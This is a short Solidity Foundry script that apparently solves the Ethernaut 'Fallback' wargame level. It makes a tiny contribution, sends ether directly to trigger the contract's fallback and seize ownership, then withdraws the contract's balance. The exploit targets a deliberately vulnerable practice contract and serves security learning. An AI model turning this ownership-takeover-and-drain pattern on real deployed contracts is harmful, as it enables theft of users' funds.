// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import "@forge-std/Script.sol";
import {Fallback} from "../src/Fallback.sol";
contract FallbackScript is Script {
    Fallback public fallbackContract;

    function setUp() public {
        fallbackContract = Fallback(payable(vm.envAddress("FALLBACK_ADDRESS")));    
    }
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        fallbackContract.contribute{value: 1 wei}();
        (bool success,) = address(fallbackContract).call{value: 1 wei}("");
        require(success, "Can't send the ether");
        fallbackContract.withdraw();
        vm.stopBroadcast();
    }
}
